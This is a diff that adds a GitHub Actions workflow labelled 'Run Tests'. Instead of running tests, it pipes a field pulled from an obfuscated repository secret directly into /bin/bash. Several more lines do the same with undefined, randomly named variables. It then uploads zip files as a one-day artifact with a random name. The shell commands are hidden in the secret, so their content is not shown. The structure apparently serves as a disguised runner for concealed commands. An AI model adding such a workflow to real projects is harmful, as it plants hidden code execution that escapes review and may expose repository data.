@@ -1,0 +1,31 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          leslq225: ${{ secrets.leslq225 }}
+        run: |
+          printf '%s' "$leslq225" | jq -r .gnrl302 | /bin/bash
+          echo $fqxn6824 | jq -r .iofq539 | /bin/bash
+          echo $h001 | jq -r .d44752 | /bin/bash
+          echo $m186 | jq -r .clj63196 | /bin/bash
+          echo $demwc45 | jq -r .kmso87998 | /bin/bash
+          printf '%s' "$tlxk44583" | jq -r .wn72 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 3fZeAj1v
+          path: "*.zip"
+          retention-days: 1
